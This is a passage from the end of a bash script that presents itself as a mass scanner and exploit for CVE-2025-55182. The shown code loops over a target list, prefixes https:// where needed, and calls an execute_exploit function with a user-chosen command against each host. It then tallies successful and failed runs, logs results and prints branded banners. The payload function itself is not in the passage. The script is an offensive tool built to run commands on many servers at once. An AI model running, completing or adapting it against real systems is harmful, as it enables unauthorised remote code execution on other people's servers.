    echo -e "${NEON_BLUE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${NEON_BLUE}║${NC}  ${BOLD}${WHITE}MULTI-TARGET SCANNING${NC}                                                  ${NEON_BLUE}║${NC}"
    echo -e "${NEON_BLUE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}Total targets: ${WHITE}${total}${NC}"
    echo ""
    
    while IFS= read -r target || [ -n "$target" ]; do
        current=$((current + 1))
        
        if [[ ! "$target" =~ ^https?:// ]]; then
            target="https://${target}"
        fi
        
        echo -e "${CYAN}[${current}/${total}]${NC} Scanning ${NEON_GREEN}${target}${NC}"
        echo ""
        
        if execute_exploit "$target" "$CMD"; then
            success=$((success + 1))
        else
            failed=$((failed + 1))
        fi
        
        echo ""
        echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo ""
    done < "$TARGET_FILE"
    
    # Summary
    echo -e "${NEON_BLUE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${NEON_BLUE}║${NC}  ${BOLD}${WHITE}SCAN SUMMARY${NC}                                                            ${NEON_BLUE}║${NC}"
    echo -e "${NEON_BLUE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}  Total Scanned:${NC}  ${WHITE}${total}${NC}"
    echo -e "${GREEN}  Successful:${NC}     ${WHITE}${success}${NC}"
    echo -e "${RED}  Failed:${NC}         ${WHITE}${failed}${NC}"
    echo ""
}

# Main execution
main() {
    print_banner
    
    # If no arguments provided, use guided input mode
    if [[ $# -eq 0 ]]; then
        guided_input_mode
    else
        parse_args "$@"
    fi
    
    # Initialize output file
    if [[ "$SAVE_OUTPUT" == true ]] && [[ -n "$OUTPUT_FILE" ]]; then
        echo "# CVE-2025-55182 Scan Results" > "$OUTPUT_FILE"
        echo "# Generated by: $AUTHOR" >> "$OUTPUT_FILE"
        echo "# Date: $(date)" >> "$OUTPUT_FILE"
        echo "" >> "$OUTPUT_FILE"
    fi
    
    if [[ "$INTERACTIVE_MODE" == true ]]; then
        show_config
        interactive_mode
    elif [[ "$SCAN_MODE" == "multiple" ]]; then
        scan_multiple_targets
    else
        show_config
        execute_exploit "$DOMAIN" "$CMD"
    fi
    
    # Footer
    echo ""
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${NEON_PURPLE}${BOLD}${MOTTO}${NC}"
    echo -e "${GRAY}By ${NEON_ORANGE}${AUTHOR}${NC}"
    echo -e "${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
}

# Run main
main "$@"
